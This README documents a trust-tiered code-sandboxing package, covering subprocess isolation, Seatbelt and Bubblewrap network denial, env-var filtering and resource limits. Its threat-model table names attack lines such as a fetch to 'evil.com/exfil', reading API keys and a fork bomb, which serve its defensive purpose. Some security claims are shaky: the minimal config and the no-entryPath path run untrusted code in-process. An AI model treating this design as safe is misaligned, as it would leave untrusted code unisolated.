# @koi/sandbox-executor — Trust-Tiered Sandbox Executor

`@koi/sandbox-executor` is an L2 package that routes code execution to per-tier backends
based on brick trust level. It provides three execution strategies — subprocess isolation
(with OS-level sandboxing), in-process `import()`, and in-process `new Function()` — and
a dispatcher that selects the correct one based on the brick's `TrustTier`.

---

## Why it exists

Forged bricks range from untrusted (community-authored, freshly forged) to human-approved
(promoted middleware). Running all of them in the same process with full privileges is a
security flaw. This package implements **defense in depth**: each trust tier gets an
execution environment proportional to its risk.

```
  Trust tier        Executor               Isolation level
  ──────────        ────────               ───────────────
  sandbox           subprocess-executor    ● Separate process
  (untrusted)                              ● Restricted env vars (no secrets)
                                           ● Network deny (Seatbelt / Bubblewrap)
                                           ● Resource limits (ulimit -v, -u)
                                           ● Timeout + SIGKILL
                                           ● 10 MB stdout cap

  verified          subprocess-executor    ● Same as sandbox
  (auto-promoted)   (falls back from       ● Higher usage threshold
                     sandbox config)

  promoted          promoted-executor      ● In-process import() or new Function()
  (human-approved)                         ● LRU cache (256-entry cap)
                                           ● Promise.race timeout
                                           ● No process isolation
                                           ● Security gate = HITL approval in @koi/forge
```

```
                           ┌──────────────────────────────┐
                           │  @koi/forge verify pipeline   │
                           │  or ForgeRuntime.resolveTool  │
                           └──────────────┬───────────────┘
                                          │
                                          ▼
                           ┌──────────────────────────────┐
                           │  TieredSandboxExecutor        │
                           │  .forTier("sandbox")          │
                           └──────────────┬───────────────┘
                                          │
                        ┌─────────────────┼─────────────────┐
                        │                 │                   │
                        ▼                 ▼                   ▼
               ┌────────────────┐ ┌────────────────┐ ┌────────────────┐
               │  subprocess    │ │  IPC bridge    │ │  promoted      │
               │  executor      │ │  (optional)    │ │  executor      │
               │  (built-in)    │ │  @koi/sandbox  │ │  (built-in)    │
               └────────────────┘ └────────────────┘ └────────────────┘
               Process-level       OS-level sandbox    In-process
               isolation via       via IPC to          new Function()
               Bun.spawn()         containerized       or import()
                                   worker
```

---

## Architecture

### Layer position

```
L0  @koi/core                ─ SandboxExecutor, SandboxResult, SandboxError,
                               ExecutionContext, TieredSandboxExecutor,
                               TierResolution, TrustTier (types only)
L2  @koi/sandbox-executor    ─ this package (no L1 dependency)
    @koi/sandbox             ─ OS-level sandbox profiles (dev dependency)
    @koi/sandbox-ipc         ─ IPC bridge to sandbox workers (dev dependency)
```

`@koi/sandbox-executor` only imports from `@koi/core` (L0) in production.
It never touches `@koi/engine` (L1) or peer L2 packages.

### Internal module map

```
index.ts                         ← public re-exports (4 symbols)
│
├── tiered-executor.ts           ← createTieredExecutor() factory
├── resolve.ts                   ← tier resolution with downward fallback
├── promoted-executor.ts         ← in-process executor (new Function + import)
│
├── subprocess-executor.ts       ← child-process executor with OS isolation
├── subprocess-runner.ts         ← child process entry point (stdin/stdout JSON)
│
├── subprocess-executor.test.ts  ← subprocess isolation tests
├── promoted-executor.test.ts    ← promoted executor tests
├── tiered-executor.test.ts      ← dispatcher + fallback tests
└── __tests__/
    └── ipc-integration.test.ts  ← IPC bridge integration (gated)
```

---

## Core concepts

### Tier resolution (downward-only fallback)

When a tier has no configured executor, the dispatcher falls **downward** (toward higher
trust), never upward. This prevents privilege escalation.

```
  Requested     Fallback chain          Why
  ─────────     ──────────────          ───
  sandbox   →   verified → promoted    Untrusted code gets next-available sandbox
  verified  →   promoted               Already partially trusted
  promoted  →   (always available)     Built-in executor is the default

  NEVER:
  promoted  →   sandbox                Would escalate restriction
  verified  →   sandbox                Would escalate restriction
```

Pre-computed at construction time into an immutable `ReadonlyMap<TrustTier, TierResolution>`.
Each `forTier()` call is O(1) map lookup.

### Subprocess executor — process-level isolation

The subprocess executor spawns a child Bun process for each execution. This provides
five layers of isolation:

```
  ┌─────────────────────────────────────────────────────────────────┐
  │  HOST PROCESS (Koi Engine)                                      │
  │                                                                 │
  │  subprocess-executor.ts                                         │
  │  ├── buildIsolatedCommand(["bun", "run", runner.ts], context)   │
  │  ├── Bun.spawn(isolatedCmd, { stdin, stdout, stderr, env })     │
  │  ├── setTimeout → proc.kill("SIGKILL")                          │
  │  └── parse JSON from stdout → SandboxResult                    │
  │                                                                 │
  │  Five isolation layers:                                         │
  │                                                                 │
  │  1. PROCESS ISOLATION                                           │
  │     Separate memory space. Child crash ≠ host crash.            │
  │     Killable via SIGKILL (not just Promise.race).               │
  │                                                                 │
  │  2. ENVIRONMENT ISOLATION                                       │
  │     Only 5 safe env vars forwarded:                             │
  │     PATH, HOME, TMPDIR, NODE_ENV, BUN_INSTALL                  │
  │                                                                 │
  │     NOT forwarded:                                              │
  │     ANTHROPIC_API_KEY, DATABASE_URL, STRIPE_SECRET, etc.        │
  │                                                                 │
  │  3. NETWORK ISOLATION (when networkAllowed=false)               │
  │     ┌─────────────────────────────────────────────────┐         │
  │     │ macOS:  sandbox-exec -p "(deny network*)" ...   │         │
  │     │ Linux:  bwrap --unshare-net ...                  │         │
  │     │ Other:  FAIL CLOSED (refuses to execute)         │         │
  │     └─────────────────────────────────────────────────┘         │
  │                                                                 │
  │  4. RESOURCE LIMITS (when resourceLimits set)                   │
  │     sh -c "ulimit -v <kb> && exec bun run ..."                  │
  │     ├── maxMemoryMb → ulimit -v (virtual memory in KB)          │
  │     └── maxPids → ulimit -u (Linux only, macOS ignores)         │
  │                                                                 │
  │  5. OUTPUT CAP                                                  │
  │     Max 10 MB stdout. Prevents OOM from malicious output.       │
  │                                                                 │
  └─────────────────────────────────────────────────────────────────┘
```

### Subprocess protocol

The runner (`subprocess-runner.ts`) uses a simple JSON-over-stdio protocol:

```
  stdin  →  { "entryPath": "/path/to/brick.ts", "input": { "a": 6, "b": 7 } }

  The runner:
  1. Reads all of stdin
  2. Parses JSON payload
  3. import(entryPath) → calls default export with input
  4. Writes result to stdout

  stdout →  { "ok": true, "output": 42 }
         or { "ok": false, "error": "boom" }

  Exit codes:
  0 = success (result in stdout)
  1 = error (error in stdout as JSON)
```

### Network isolation — OS-level enforcement

Static analysis in `@koi/forge` catches 19 network evasion patterns at forge time.
Runtime enforcement via OS sandbox ensures that even undetected patterns cannot reach
the network.

```
  ┌──────────────────────────────────────────────────────┐
  │  buildIsolatedCommand(["bun", "run", runner.ts], {   │
  │    networkAllowed: false,                             │
  │    workspacePath: "/tmp/workspace"                    │
  │  })                                                   │
  └────────────────────────┬─────────────────────────────┘
                           │
              ┌────────────┼────────────┐
              │            │            │
              ▼            ▼            ▼
         macOS         Linux        Other
              │            │            │
              ▼            ▼            ▼
  ┌──────────────┐ ┌──────────────┐ ┌──────────────┐
  │ sandbox-exec │ │ bwrap        │ │ FAIL CLOSED  │
  │ -p <profile> │ │ --unshare-net│ │ (PERMISSION  │
  │ sh -c "..."  │ │ --ro-bind /  │ │  error)      │
  └──────────────┘ │ --bind ws ws │ └──────────────┘
                   │ --tmpfs /tmp │
  Seatbelt SBPL:   │ sh -c "..."  │
  (deny default)   └──────────────┘
  (allow process-*)
  (allow file-read*)
  (allow file-write*
    workspace + /tmp)
  (allow mach-lookup)
  (allow sysctl-read)
  (allow signal self)
  (deny network*)
```

**Fail-closed design**: if network isolation is requested but no OS sandbox is available
(e.g., Windows or Linux without Bubblewrap), execution is **refused** with a `PERMISSION`
error rather than silently running without isolation. This is a security-critical decision —
never degrade silently.

### Resource limits

Memory and PID limits are enforced via `ulimit` wrappers around the subprocess command.

```
  resourceLimits: { maxMemoryMb: 256, maxPids: 32 }

  macOS:   sh -c "ulimit -v 262144 && exec sandbox-exec -p ... bun run ..."
                   └── 256 * 1024 KB         (maxPids ignored on macOS)

  Linux:   sh -c "ulimit -v 262144 && ulimit -u 32 && exec bwrap ... bun run ..."
                   └── memory                 └── process count

  Note: macOS does NOT support ulimit -v for virtual memory.
  Resource limits on macOS are enforced only at the ulimit level for
  other limits. For memory, rely on the timeout + SIGKILL backstop.
```

### Promoted executor — in-process execution

For human-approved bricks (`promoted` tier), isolation is unnecessary. The promoted
executor runs code in the host process for maximum performance:

```
  Two execution modes:

  1. import() mode (when context.entryPath is provided):
     ├── Dynamic import() with query-string cache busting
     ├── Calls default export with input
     ├── Promise.race timeout
     └── LRU cached (256 entries, keyed by entryPath)

  2. new Function() mode (fallback, no entry file):
     ├── new Function("input", code) → CompiledFn
     ├── Promise.resolve(fn(input))
     └── LRU cached (256 entries, keyed by code string)
```

---

## Threat model

The subprocess executor defends against these attack vectors from untrusted bricks:

```
  Attack                        Defense                         Layer
  ──────                        ───────                         ─────
  Read ANTHROPIC_API_KEY        Environment isolation           2
  Read DATABASE_URL             Environment isolation           2
  fetch("evil.com/exfil")       Seatbelt/Bubblewrap network deny 3
  globalThis.fetch(...)         Static analysis + runtime deny  3
  while(true) alloc(1GB)        ulimit -v + timeout + SIGKILL   4
  fork bomb                     ulimit -u (Linux)               4
  process.exit(0) + side-effect Separate process                1
  Infinite loop                 setTimeout → SIGKILL            1
  Write 100GB to stdout         10 MB stdout cap                5
  Crash with segfault           Child process crash isolation   1
  Modify host heap              Separate memory space           1
```

---

## API reference

### Factory functions

```typescript
// Subprocess executor — spawns child Bun processes with OS isolation
createSubprocessExecutor(): SandboxExecutor

// Promoted executor — in-process new Function() / import()
createPromotedExecutor(): SandboxExecutor

// Tiered dispatcher — routes by TrustTier with downward fallback
createTieredExecutor(config: TieredExecutorConfig): Result<TieredSandboxExecutor, KoiError>
```

### Types

| Type | Source | Description |
|------|--------|-------------|
| `SandboxExecutor` | `@koi/core` | Pluggable executor contract (`execute()`) |
| `SandboxResult` | `@koi/core` | `{ output, durationMs, memoryUsedBytes? }` |
| `SandboxError` | `@koi/core` | `{ code, message, durationMs }` |
| `SandboxErrorCode` | `@koi/core` | `"TIMEOUT" \| "OOM" \| "PERMISSION" \| "CRASH"` |
| `ExecutionContext` | `@koi/core` | `{ workspacePath?, entryPath?, networkAllowed?, resourceLimits? }` |
| `TieredSandboxExecutor` | `@koi/core` | `{ forTier(tier) → TierResolution }` |
| `TierResolution` | `@koi/core` | `{ executor, requestedTier, resolvedTier, fallback }` |
| `TrustTier` | `@koi/core` | `"sandbox" \| "verified" \| "promoted"` |
| `TieredExecutorConfig` | this pkg | `{ sandbox?, verified?, promoted? }` |
| `SandboxPlatform` | this pkg | `"seatbelt" \| "bwrap" \| "none"` |
| `IsolatedCommand` | this pkg | `{ cmd, platform, degraded? }` |

### Utility functions (subprocess-executor)

```typescript
// Detect OS sandbox capability (cached, one-time detection)
detectSandboxPlatform(): SandboxPlatform

// Shell-safe single-quote wrapping
shellEscape(s: string): string

// Build OS-isolated command wrapping base command
buildIsolatedCommand(baseCmd: readonly string[], context?: ExecutionContext): IsolatedCommand
```

### Constants

| Constant | Value | Description |
|----------|-------|-------------|
| `SAFE_ENV_KEYS` | `PATH, HOME, TMPDIR, NODE_ENV, BUN_INSTALL` | Env vars forwarded to child |
| `MAX_STDOUT_BYTES` | `10 * 1024 * 1024` (10 MB) | Stdout cap per execution |
| `DEFAULT_LRU_CAP` | `256` | Promoted executor cache size |

---

## Configuration

### TieredExecutorConfig

```typescript
interface TieredExecutorConfig {
  readonly sandbox?: SandboxExecutor;    // executor for sandbox tier
  readonly verified?: SandboxExecutor;   // executor for verified tier
  readonly promoted?: SandboxExecutor;   // executor for promoted tier (auto-created if omitted)
}
```

**Minimal config** — promoted tier auto-creates a built-in executor:

```typescript
const result = createTieredExecutor({});
// promoted = createPromotedExecutor() (auto)
// sandbox → falls back to promoted
// verified → falls back to promoted
```

**Recommended config** — subprocess for sandbox/verified, built-in for promoted:

```typescript
const subprocess = createSubprocessExecutor();
const result = createTieredExecutor({
  sandbox: subprocess,
  verified: subprocess,
  // promoted auto-created
});
```

**Full config** — all tiers explicit:

```typescript
const result = createTieredExecutor({
  sandbox: createSubprocessExecutor(),
  verified: createSubprocessExecutor(),
  promoted: createPromotedExecutor(),
});
```

### ExecutionContext (passed per-call)

```typescript
interface ExecutionContext {
  readonly workspacePath?: string;       // brick workspace with node_modules
  readonly entryPath?: string;           // brick entry .ts file
  readonly networkAllowed?: boolean;     // default: undefined (no isolation)
  readonly resourceLimits?: {
    readonly maxMemoryMb?: number;       // ulimit -v (KB)
    readonly maxPids?: number;           // ulimit -u (Linux only)
  };
}
```

---

## Data flow

### Subprocess execution (sandbox/verified tier)

```
  @koi/forge verify pipeline
       │
       ▼
  tieredExecutor.forTier("sandbox")
       │
       ▼
  TierResolution { executor: subprocessExecutor, ... }
       │
       ▼
  executor.execute(code, input, timeoutMs, context)
       │
       ├── context.entryPath provided?
       │   │
       │   ├── YES: subprocess path
       │   │   │
       │   │   ▼
       │   │   buildIsolatedCommand(["bun", "run", runner.ts], context)
       │   │   │
       │   │   ├── networkAllowed=false? → wrap with sandbox-exec / bwrap
       │   │   ├── resourceLimits?       → prefix with ulimit
       │   │   └── degraded?             → FAIL CLOSED (PERMISSION error)
       │   │   │
       │   │   ▼
       │   │   Bun.spawn(isolatedCmd, {
       │   │     stdin: JSON.stringify({ entryPath, input }),
       │   │     env: { PATH, HOME, TMPDIR, NODE_ENV, BUN_INSTALL, NODE_PATH },
       │   │     cwd: workspacePath
       │   │   })
       │   │   │
       │   │   ├── timeout → SIGKILL
       │   │   ├── exitCode ≠ 0 → parse error from stdout/stderr
       │   │   ├── stdout > 10MB → CRASH error
       │   │   └── exitCode = 0 → parse JSON → SandboxResult
       │   │
       │   └── NO: fallback to new Function()
       │       new Function("input", code)(input)
       │
       ▼
  Result<{ ok: true, value: SandboxResult } | { ok: false, error: SandboxError }>
```

### Child process execution (subprocess-runner.ts)

```
  Child process starts
       │
       ▼
  Read stdin → parse JSON → { entryPath, input }
       │
       ▼
  import(entryPath) → get default export
       │
       ├── typeof fn !== "function" → { ok: false, error: "no default function" }, exit(1)
       │
       ▼
  await fn(input) → output
       │
       ├── throw? → { ok: false, error: message }, exit(1)
       │
       ▼
  stdout ← JSON.stringify({ ok: true, output })
  exit(0)
```

### Error classification

```
  Error message contains:            Classified as:
  ────────────────────────           ──────────────
  "timed out" or "SIGKILL"          TIMEOUT
  "Permission denied" or "EACCES"   PERMISSION
  "out of memory" or "OOM"          OOM
  anything else                     CRASH
```

---

## Examples

### Minimal: subprocess executor

```typescript
import { createSubprocessExecutor } from "@koi/sandbox-executor";

const executor = createSubprocessExecutor();

// Run inline code (no entry file — uses new Function fallback)
const result = await executor.execute("return input.a + input.b;", { a: 3, b: 7 }, 5_000);
// result = { ok: true, value: { output: 10, durationMs: 1 } }
```

### Subprocess with entry file and network isolation

```typescript
import { createSubprocessExecutor } from "@koi/sandbox-executor";

const executor = createSubprocessExecutor();

const result = await executor.execute(
  "",                        // code ignored when entryPath is set
  { email: "test@test.com" },
  10_000,
  {
    entryPath: "/tmp/workspace/validate-email.ts",
    workspacePath: "/tmp/workspace",
    networkAllowed: false,   // → sandbox-exec (macOS) or bwrap (Linux)
    resourceLimits: {
      maxMemoryMb: 256,      // → ulimit -v 262144
    },
  },
);
```

### Tiered executor with full config

```typescript
import { createSubprocessExecutor, createTieredExecutor } from "@koi/sandbox-executor";

const subprocess = createSubprocessExecutor();
const result = createTieredExecutor({
  sandbox: subprocess,
  verified: subprocess,
  // promoted auto-created with built-in executor
});

if (!result.ok) {
  throw new Error(result.error.message);
}

const tiered = result.value;

// Route by trust tier
const sandboxRes = tiered.forTier("sandbox");
// sandboxRes = { executor: subprocess, requestedTier: "sandbox", resolvedTier: "sandbox", fallback: false }

const promotedRes = tiered.forTier("promoted");
// promotedRes = { executor: builtIn, requestedTier: "promoted", resolvedTier: "promoted", fallback: false }

// Execute via resolved executor
const execResult = await sandboxRes.executor.execute(
  "",
  { x: 6, y: 7 },
  10_000,
  { entryPath: "/path/to/brick.ts", networkAllowed: false },
);
```

### Full integration with @koi/forge

```typescript
import { createSubprocessExecutor, createTieredExecutor } from "@koi/sandbox-executor";
import { createForgeRuntime, createInMemoryForgeStore, createDefaultForgeConfig } from "@koi/forge";

// 1. Create executor stack
const subprocess = createSubprocessExecutor();
const tieredResult = createTieredExecutor({ sandbox: subprocess, verified: subprocess });
if (!tieredResult.ok) throw new Error(tieredResult.error.message);

// 2. Create forge runtime
const store = createInMemoryForgeStore();
const runtime = createForgeRuntime({
  store,
  executor: tieredResult.value,
});

// 3. Resolve and execute forged tool
const tool = await runtime.resolveTool("my-tool");
if (tool !== undefined) {
  const result = await tool.execute({ a: 40, b: 2 });
  // Executed in subprocess with OS-level isolation
}

runtime.dispose?.();
```

---

## Platform support

| Platform | Network isolation | Memory limits | PID limits |
|----------|------------------|---------------|------------|
| macOS (Darwin) | Seatbelt (`sandbox-exec -p`) | `ulimit -v` (not supported for virtual memory) | Not supported |
| Linux | Bubblewrap (`bwrap --unshare-net`) | `ulimit -v` | `ulimit -u` |
| Other | Fail closed (PERMISSION error) | `ulimit -v` | `ulimit -u` |

**macOS note**: `ulimit -v` for virtual memory does not work on macOS
(`"cannot modify limit: Invalid argument"`). Memory limits on macOS rely on the
timeout + SIGKILL backstop. Network isolation via Seatbelt is fully functional.

**Linux note**: Bubblewrap (`bwrap`) must be installed. The executor auto-detects it
via `which bwrap`. If unavailable and network isolation is requested, execution is
refused (fail closed).

---

## Layer compliance

```
L0  @koi/core ─────────────────────────────────────────────┐
    SandboxExecutor, SandboxResult, SandboxError,           │
    ExecutionContext, TieredSandboxExecutor,                 │
    TierResolution, TrustTier                               │
                                                            ▼
L2  @koi/sandbox-executor ◀────────────────────────────────┘
    imports from L0 only (production)
    ✗ never imports @koi/engine (L1)
    ✗ never imports peer L2 packages in production
    ✓ Bun.spawn() / Bun.spawnSync() are runtime built-ins
```

---

## Related

- [Koi Architecture](../architecture/Koi.md) — system overview and layer rules
- [@koi/forge](./forge.md) — self-extension runtime (verification pipeline, provenance, governance)
- `@koi/sandbox` — OS-level sandbox profiles and worker management
- `@koi/sandbox-ipc` — IPC bridge to sandbox workers (alternative sandbox backend)
- `@koi/core` — L0 contract definitions (`SandboxExecutor`, `ExecutionContext`)
